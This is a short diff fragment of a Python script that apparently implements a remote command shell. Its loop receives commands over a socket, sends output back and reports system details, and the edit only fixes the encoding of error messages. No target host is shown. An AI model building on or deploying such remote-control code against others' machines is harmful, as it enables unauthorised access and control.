@@ -79,10 +79,10 @@ Processor Architecture: {platform.processor()}
             else:
                 sock.send(STDOUT)
         else:
-            sock.send(E+"Unrecognized command!")
+            sock.send("Unrecognized command!".encode())
 
         if not cmd:
             break
     except Exception as e:
-        sock.send(E+"An error has occured: {}".format(str(e)).encode())
+        sock.send("An error has occured: {}".format(str(e)).encode())
 sock.close()
